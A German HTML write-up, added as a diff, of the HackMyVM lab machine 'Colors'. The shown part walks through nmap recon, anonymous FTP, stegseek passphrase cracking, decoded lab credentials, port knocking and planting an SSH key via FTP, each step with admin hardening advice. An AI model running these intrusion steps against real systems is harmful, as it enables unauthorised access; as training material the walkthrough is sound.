@@ -1,0 +1,913 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Colors - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Colors - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">stegseek</div>
+                 <div class="tool-item">steghide</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">CyberChef</div>
+                 <div class="tool-item">ftp</div>
+                 <div class="tool-item">knock</div>
+                 <div class="tool-item">exiftool</div>
+                 <div class="tool-item">telnet</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">mv</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">vim</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">nano</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">ping</div>
+                 <div class="tool-item">apt-get</div>
+                 <div class="tool-item">bettercap</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">sh</div>
+                 <div class="tool-item">ip</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80)</a></li>
+                <li><a href="#ftp-enumeration">FTP Enumeration & Steganographie</a></li>
+                <li><a href="#port-knocking">Port Knocking</a></li>
+                <li><a href="#ftp-access-pink">FTP Access (pink)</a></li>
+                <li><a href="#ssh-access-poc">SSH Access (pink - POC)</a></li>
+                <li><a href="#web-shell-rce">Web Shell / RCE (www-data)</a></li>
+                <li><a href="#privesc-green-poc">Privilege Escalation (www-data zu green - POC)</a></li>
+                <li><a href="#lateral-movement-purple">Lateral Movement (green zu purple)</a></li>
+                <li><a href="#privesc-root-poc">Privilege Escalation (purple zu root - POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.120</span>	08:00:27:ef:ea:d2	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der ARP-Scan identifiziert die IP-Adresse `192.168.2.120` und die zugehörige MAC-Adresse, die auf eine VirtualBox-VM hinweist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zielsystem im lokalen Netzwerk gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Nmap-Scan auf die IP `192.168.2.120` durch. Optional: Fügen Sie einen Hostnamen (z.B. `color.hmv`) in `/etc/hosts` hinzu.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Scan-Detection können die Aufklärung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.120 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 00:50 CEST
+Nmap scan report for color (192.168.2.120)
+Host is up (0.00013s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+<span class="command">21/tcp open     ftp     vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+| <span class="command">-rw-r--r--    1 1127     1127            0 Jan 27 23:45 first</span>
+| <span class="command">-rw-r--r--    1 1039     1039            0 Jan 27 23:45 second</span>
+| <span class="command">-rw-r--r--    1 0        0          290187 Feb 11 17:35 secret.jpg</span>
+| <span class="command">-rw-r--r--    1 1081     1081            0 Jan 27 23:45 third</span>
+| ftp-syst: [...] vsFTPd 3.0.3 [...]
+|_End of status
+<span class="command">22/tcp filtered ssh</span>
+<span class="command">80/tcp open     http    Apache httpd 2.4.54 ((Debian))</span>
+|_http-title: Document
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:EF:EA:D2 (Oracle VirtualBox virtual NIC)
+[...]
+Service Info: OS: Unix
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan identifiziert drei Ports:
+                 *   Port 21 (FTP): Offen, vsftpd 3.0.3. Wichtig: **Anonymer FTP-Login ist erlaubt!** Das Nmap-Skript listet auch direkt den Inhalt des FTP-Stammverzeichnisses auf: die leeren Dateien `first`, `second`, `third` mit ungewöhnlichen User/Group IDs (1127, 1039, 1081) und eine Bilddatei `secret.jpg`.
+                 *   Port 22 (SSH): Gefiltert. Das bedeutet, Nmap konnte nicht eindeutig feststellen, ob der Port offen oder geschlossen ist, oft aufgrund einer Firewall-Regel.
+                 *   Port 80 (HTTP): Offen, Apache 2.4.54.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der erlaubte anonyme FTP-Zugriff ist ein sehr vielversprechender Einstiegspunkt. Die Dateien auf dem FTP-Server, insbesondere die leeren Dateien mit den numerischen IDs und `secret.jpg`, sind sofortige Untersuchungsziele. Der gefilterte SSH-Port deutet auf Port Knocking oder eine Firewall hin.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinden Sie sich sofort anonym per FTP und laden Sie `secret.jpg` herunter. Analysieren Sie die leeren Dateien und ihre IDs (1127, 1039, 1081) – dies könnte eine Port-Knocking-Sequenz sein. Untersuchen Sie den Webserver (Port 80). Behalten Sie den gefilterten SSH-Port im Hinterkopf.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, es sei denn, er ist absolut notwendig und sicher konfiguriert (z.B. nur Leserechte, Chroot Jail). Überprüfen Sie Firewall-Regeln für SSH (Port 22). Vermeiden Sie das Ablegen potenziell sensibler Dateien im FTP-Verzeichnis.</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration (Port 80)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.120 -x [...] -w [...] -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+[...]
+<span class="command">http://192.168.2.120/index.html</span>           [Size: 295]
+<span class="command">http://192.168.2.120/manual</span>               [Size: 315] [--> http://192.168.2.120/manual/]
+[...]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Gobuster-Scan auf Port 80 findet die `index.html` und ein Verzeichnis `/manual`, das auf `/manual/` weiterleitet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Webserver scheint relativ klein zu sein. Das `/manual`-Verzeichnis könnte interessant sein (oft Apache-Standarddokumentation).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/manual/`. Der Fokus sollte jedoch auf dem FTP-Server liegen.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie Standard-Dokumentationsverzeichnisse wie `/manual`, wenn sie nicht benötigt werden.</p>
+        </section>
+
+        <section id="ftp-enumeration">
+             <h2>FTP Enumeration & Steganographie</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget -r ftp://192.168.2.120</span></div>
+                    <pre>
+[...]
+Anmelden als anonymous … Angemeldet!
+[...]
+2023-04-06 00:52:39 (0,00 B/s) - »192.168.2.120/first« gespeichert [0]
+[...]
+2023-04-06 00:52:39 (0,00 B/s) - »192.168.2.120/second« gespeichert [0]
+[...]
+2023-04-06 00:52:39 (4,04 MB/s) - »192.168.2.120/secret.jpg« gespeichert [290187]
+[...]
+2023-04-06 00:52:39 (0,00 B/s) - »192.168.2.120/third« gespeichert [0]
+[...]
+Geholt: 4 Dateien, 283K in 0,07s (4,04 MB/s)
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `wget -r` wird verwendet, um rekursiv alle Dateien vom anonymen FTP-Server herunterzuladen. Es bestätigt den erfolgreichen anonymen Login und lädt die vier zuvor von Nmap identifizierten Dateien (`first`, `second`, `secret.jpg`, `third`) herunter.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die relevanten Dateien vom FTP-Server sind nun lokal zur Analyse verfügbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die heruntergeladene `secret.jpg` auf Steganographie. Betrachten Sie die Namen und Metadaten (falls vorhanden) der leeren Dateien `first`, `second`, `third` im Zusammenhang mit den aus dem Nmap-Scan bekannten User/Group IDs (1127, 1039, 1081) – dies erhärtet den Verdacht auf Port Knocking.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff oder sichern Sie ihn stark ab.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">stegseek /home/cyber/Downloads/secret.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+<span class="password">[i] Found passphrase: "Nevermind"</span>
+[i] Original filename: "more_secret.txt".
+[i] Extracting to "secret.jpg.out".
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `stegseek` wird verwendet, um zu versuchen, mit `steghide` versteckte Daten aus `secret.jpg` zu extrahieren, wobei `rockyou.txt` als Passwortliste für den Brute-Force-Versuch dient.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! `stegseek` findet das korrekte Passwort `<span class="password">Nevermind</span>` und extrahiert eine versteckte Datei namens `more_secret.txt` (gespeichert als `secret.jpg.out`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigen Sie die Extraktion manuell mit `steghide` und dem gefundenen Passwort. Analysieren Sie den Inhalt der extrahierten Datei `more_secret.txt`.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Dateien auf eingebettete versteckte Daten, insbesondere bei anonymen Uploads oder öffentlichen Bereichen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">steghide extract -sf /home/cyber/Downloads/secret.jpg</span></div>
+                    <pre>
+Passwort eingeben: <span class="password">Nevermind</span>
+<span class="password">Extrahierte Daten wurden nach "more_secret.txt" geschrieben.</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Manuelle Extraktion mit `steghide` und dem gefundenen Passwort `Nevermind`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Fund und die Extraktion der Datei `more_secret.txt`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">ll</span></div>
+                     <pre>
+insgesamt 8
+-rw-r--r-- 1 root root   0 27. Jan 23:45 first
+<span class="command">-rw-r--r-- 1 root root 316  6. Apr 00:59 more_secret.txt</span>
+-rw-r--r-- 1 root root   0 27. Jan 23:45 second
+-rw-r--r-- 1 root root 316  6. Apr 00:57 secret.jpg.out <span class="comment"><!-- Identisch mit more_secret.txt --></span>
+-rw-r--r-- 1 root root   0 27. Jan 23:45 third
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Listet die heruntergeladenen und extrahierten Dateien auf.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies der Inhalt von more_secret.txt ist -->
+                     <pre style="word-break: break-all; color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command"><-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2/F<G+4+EV:DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/gT-E,9H5AM,)nEb/Zr/gPrF(9-3ATBC1E+s33`'O.CG^/BkJ\:</span>
+</pre> <span class="comment"><!-- Maskierung --></span>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies das Ergebnis der CyberChef-Analyse ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// CyberChef Analyse (Base85 Decode)
+Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.
+<span class="password">pink:Pink4sPig$$</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `more_secret.txt` ist eine lange Zeichenkette, die als Base85 identifiziert und dekodiert wird (z.B. mit CyberChef). Die Dekodierung ergibt ein Zitat und am Ende eine Zeile mit potenziellen Zugangsdaten: `<span class="password">pink:Pink4sPig$$</span>`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Zugangsdaten (Benutzername `pink`, Passwort `Pink4sPig$$`) wurden durch Steganographie und anschließende Dekodierung aufgedeckt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesen Zugangsdaten bei den verfügbaren Diensten anzumelden (FTP, SSH - falls es geöffnet wird).<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie das Verstecken von Zugangsdaten in öffentlich zugänglichen Dateien. Verwenden Sie starke, einzigartige Passwörter und sichere Speichermethoden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">ftp 192.168.2.120</span></div>
+                    <pre>
+[...]
+Name (192.168.2.120:cyber): <span class="command">anonymous</span>
+[...]
+230 Login successful.
+[...]
+<span class="prompt" style="color: gray;">ftp></span> <span class="command">put secret.jpg.out</span>
+local: secret.jpg.out remote: secret.jpg.out
+229 Entering Extended Passive Mode (|||61251|)
+<span class="password">550 Permission denied.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach der Extraktion wird versucht, die extrahierte Datei (`secret.jpg.out`) wieder auf den anonymen FTP-Server hochzuladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Versuch schlägt mit "Permission denied" fehl. Der anonyme FTP-Benutzer hat keine Schreibrechte, was eine korrekte und sichere Konfiguration ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der anonyme FTP ist nur zum Lesen nützlich. Verwenden Sie die gefundenen `pink`-Zugangsdaten.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass anonyme FTP-Benutzer niemals Schreibrechte haben.</p>
+        </section>
+
+        <section id="port-knocking">
+             <h2>Port Knocking</h2>
+             <p class="analysis"><strong>Kontext:</strong> Basierend auf dem gefilterten SSH-Port (22) und den leeren Dateien (`first`, `second`, `third`) mit spezifischen User/Group IDs (1127, 1039, 1081) auf dem FTP-Server wird Port Knocking vermutet. Diese IDs werden als die Portsequenz für das "Klopfen" interpretiert.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">knock 192.168.2.120 1127 1039 1081</span></div>
+                    <pre><span class="comment">[Keine Ausgabe von knock, aber Pakete wurden gesendet]</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das `knock`-Tool wird verwendet, um TCP-SYN-Pakete (Standardeinstellung von `knock`) nacheinander an die Ports 1127, 1039 und 1081 des Zielsystems zu senden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Versuch, die durch Port Knocking geschützte Firewall-Regel für Port 22 zu öffnen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie unmittelbar nach dem Knocking erneut den Status von Port 22 mit Nmap.<br><strong>Empfehlung (Admin):</strong> Port Knocking kann eine zusätzliche Sicherheitsebene bieten, ist aber durch Sniffing oder Replay-Angriffe angreifbar und kann die legitime Nutzung erschweren. Verwenden Sie es mit Bedacht und in Kombination mit anderen Sicherheitsmaßnahmen (starke Authentifizierung, VPNs).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.120 -p22</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 01:12 CEST
+Nmap scan report for color (192.168.2.120)
+Host is up (0.00014s latency).
+
+PORT   STATE <span class="password">SERVICE</span> VERSION
+<span class="password">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 82c7a434628f8e726c0d5d93d8b41e1d (RSA)
+|   256 651cc807359209e44384cd83bb561f6d (ECDSA)
+|_  256 e6e4eb9b6d2252ddec763f8103486632 (ED25519)
+[...]
+Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Unmittelbar nach dem `knock`-Befehl wird Port 22 erneut mit Nmap gescannt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Port 22 wird nun als `<span class="password">open</span>` gemeldet, während er zuvor als `filtered` angezeigt wurde. Das Port Knocking war erfolgreich und hat die Firewall-Regel für SSH geöffnet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, sich per SSH mit den gefundenen `pink`-Zugangsdaten anzumelden.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Port-Knocking-Konfiguration und deren Sicherheit. Stellen Sie sicher, dass die Klopfsequenz nicht leicht zu erraten oder aus öffentlich zugänglichen Informationen (wie hier den FTP-Datei-IDs) ableitbar ist.</p>
+
+             <!-- Irrelevanter exiftool-Befehl -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">exiftool seized.png</span></div>
+                    <pre>[...] <span class="comment"><!-- Standard PNG Metadaten --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `exiftool` wird auf eine Datei `seized.png` angewendet, die bisher nicht erwähnt wurde (möglicherweise ein Überbleibsel oder lokaler Test).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Scheint für den aktuellen Pfad irrelevant zu sein, da keine nützlichen Metadaten gefunden werden und der Kontext unklar ist.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">telnet color.hmv 22</span></div>
+                    <pre>
+Trying 192.168.2.120...
+<span class="password">Connected to color.hmv.</span>
+Escape character is '^]'.
+<span class="command">SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Telnet-Verbindung zu Port 22 wird hergestellt, um das SSH-Banner abzurufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der SSH-Dienst auf Port 22 jetzt erreichbar ist und antwortet.</p>
+        </section>
+
+        <section id="ftp-access-pink">
+             <h2>FTP Access (pink)</h2>
+             <p class="analysis"><strong>Kontext:</strong> Nach der Entdeckung der Zugangsdaten `pink:Pink4sPig$$` wird versucht, sich damit am FTP-Server anzumelden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">ftp 192.168.2.120</span></div>
+                    <pre>
+Connected to 192.168.2.120.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.120:cyber): <span class="command">pink</span>
+331 Please specify the password.
+Password: <span class="password">[Passwort Pink4sPig$$ eingegeben]</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+<span class="prompt" style="color: gray;">ftp></span> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||11902|)
+150 Here comes the directory listing.
+drwx------    2 1127     1127         4096 Feb 11 20:55 <span class="command">green</span>
+drwx------    3 1000     1000         4096 Feb 11 20:18 <span class="command">pink</span>
+drwx------    2 1081     1081         4096 Feb 20 17:07 <span class="command">purple</span>
+drwx------    2 1039     1039         4096 Feb 11 20:56 <span class="command">red</span>
+226 Directory send OK.
+</pre>
+                </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Erfolgreicher FTP-Login als Benutzer `pink` mit dem Passwort `Pink4sPig$$`. Das Listing zeigt vier Verzeichnisse, benannt nach Farben: `green`, `pink`, `purple`, `red`. Dies scheint das Root-Verzeichnis zu sein, nicht das Home-Verzeichnis von `pink`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der FTP-Zugang als `pink` funktioniert. Das Auflisten anderer Verzeichnisse deutet erneut auf ein fehlendes oder falsch konfiguriertes Chroot Jail hin.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie in das `pink`-Verzeichnis, um das tatsächliche Home-Verzeichnis zu untersuchen. Versuchen Sie auch, sich per SSH als `pink` anzumelden (obwohl der erste Versuch fehlschlug).<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Chroot Jails für FTP-Benutzer. Überprüfen Sie die FTP-Konfiguration.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd pink</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">ls</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||52779|)
+150 Here comes the directory listing.
+<span class="command">-rw-r--r--    1 1000     1000           23 Feb 11 17:59 note.txt</span>
+226 Directory send OK.
+</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">get note.txt</span></div>
+                     <pre>
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||40327|)
+150 Opening BINARY mode data connection for note.txt (23 bytes).
+[...]
+226 Transfer complete.
+23 bytes received in 00:00 (1.04 KiB/s)
+</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">cat note.txt</span></div>
+                     <pre>nothing to see here...</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Wechsel in das `pink`-Verzeichnis auf dem FTP-Server. Eine Datei `note.txt` wird gefunden, heruntergeladen und ihr Inhalt angezeigt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Notiz "nothing to see here..." ist wahrscheinlich eine Sackgasse oder ein Troll.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd ..</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd purple</span></div>
+                     <pre>550 Failed to change directory.</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd red</span></div>
+                     <pre>550 Failed to change directory.</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd green</span></div>
+                     <pre>550 Failed to change directory.</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Versuch, in die anderen Farb-Verzeichnisse (`purple`, `red`, `green`) zu wechseln, schlägt fehl.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `pink` hat keine Berechtigung, diese Verzeichnisse zu betreten.</p>
+
+             <!-- Verwirrender Teil: shell.php wird erwähnt, aber nicht gefunden -->
+              <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Browser-Aufruf -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+http://192.168.2.120/shell.php
+                     </pre>
+                     <!-- Kein Prompt, Server-Antwort -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px; margin-top: 5px;">
+Not Found
+
+The requested URL was not found on this server.
+Apache/2.4.54 (Debian) Server at 192.168.2.120 Port 80
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine `shell.php` auf dem Webserver aufzurufen, diese wird aber nicht gefunden (404).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Keine Webshell unter diesem Pfad vorhanden.</p>
+
+        </section>
+
+         <section id="ssh-access-poc">
+             <h2>SSH Access (pink - POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration des SSH-Zugriffs als Benutzer `pink` mithilfe eines hochgeladenen SSH-Schlüssels.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   FTP-Zugriff als `pink`.
+                 *   Schreibrechte im `.ssh`-Verzeichnis von `pink`.
+                 *   Offener SSH-Port (nach Port Knocking).
+                 *   SSH-Schlüsselpaar des Angreifers.
+             </p>
+             <p class="recommendation"><strong>Risiko:</strong> Hoch. Ermöglicht interaktiven Shell-Zugriff auf das System.</p>
+
+             <p class="analysis"><strong>Schritt 1: Überprüfung/Vorbereitung des SSH-Verzeichnisses (FTP)</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+drwx------    2 1000     1000         4096 Feb 11 20:55 <span class="command">.ssh</span>
+[...]
+-rw-------    1 1000     1000       <span class="command">5492 Apr  6 02:00 shell.php</span> <span class="comment"><!-- Interessant, eine Shell existiert hier? --></span>
+226 Directory send OK.
+</pre>
+                      <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd .ssh</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                      <div class="prompt" style="color: gray;">ftp></span> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+drwx------    2 1000     1000         4096 Feb 11 20:55 .
+drwx------    3 1000     1000         4096 Apr  6 01:44 ..
+<span class="comment">[Keine authorized_keys Datei vorhanden]</span>
+226 Directory send OK.
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Zurück im Home-Verzeichnis von `pink` via FTP. Ein `.ssh`-Verzeichnis existiert. Überraschenderweise ist hier auch eine `shell.php` vorhanden (möglicherweise ein Überbleibsel eines früheren Versuchs oder ein anderer Mechanismus). Das `.ssh`-Verzeichnis ist leer (keine `authorized_keys`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das leere `.ssh`-Verzeichnis erlaubt das Hochladen des eigenen öffentlichen Schlüssels.</p>
+
+            <p class="analysis"><strong>Schritt 2: SSH-Schlüssel vorbereiten (Angreifer)</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">cat /root/.ssh/id_rsa.pub</span></div>
+                    <pre>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfSQAyP[...] root@cyber</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfSQAyP[...]' > authorized_keys</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.120]
+└─# <span class="command">chmod 600 authorized_keys</span></div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der öffentliche SSH-Schlüssel des Angreifers (`/root/.ssh/id_rsa.pub`) wird in eine lokale Datei namens `authorized_keys` geschrieben und die Berechtigungen werden korrekt auf 600 gesetzt.</p>
+
+             <p class="analysis"><strong>Schritt 3: SSH-Schlüssel hochladen (FTP)</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">put authorized_keys</span></div>
+                     <pre>
+local: authorized_keys remote: authorized_keys
+229 Entering Extended Passive Mode (|||58852|)
+150 Ok to send data.
+[...]
+<span class="password">226 Transfer complete.</span>
+553 bytes sent in 00:00 (1.39 MiB/s)
+</pre>
+                 </div>
+             </div>
